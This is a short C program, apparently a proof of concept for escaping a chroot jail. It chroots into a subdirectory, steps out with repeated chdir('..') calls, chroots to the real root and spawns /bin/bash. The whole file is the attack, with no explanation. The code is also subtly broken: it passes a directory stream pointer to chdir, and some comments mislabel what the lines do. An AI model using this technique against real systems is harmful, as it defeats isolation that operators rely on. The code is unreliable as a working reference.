#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include <stdlib.h>

void print_current();

int main(int argc, char** argv) {

        int i;
        DIR *dir;
        print_current();
        puts("Chroot to /tmp\n");

        // Create jail
        if(chroot("/tmp") != 0) {
                printf("chroot to /tmp failure \n");
                exit(EXIT_FAILURE);
        }

        // Create dir
        dir = opendir("bin");


        if(chroot("/bin") != 0) {
                printf("chroot to /bin failure \n");
                exit(EXIT_FAILURE);
        }

        print_current();

        puts("Chdir to the hander\n");
        if(chdir(dir) != 0)
                printf("change directory to handler failure \n");

        print_current();

        for(i = 0; i < 1024; i++) {
                if(chdir("..") != 0) {
                        printf("%d Unable to cd ..\n", i);
                }
        }

        print_current();

       // Chroot to  .
        if(chroot(".") != 0) {
                printf("chroot failure \n");
                exit(EXIT_FAILURE);
        }

        system("/bin/bash");

        return 0;
}

void print_current() {

        char buffer[100];

        getcwd (buffer, 50);
        printf("Current Directory: %s\n", buffer);
        return;
}
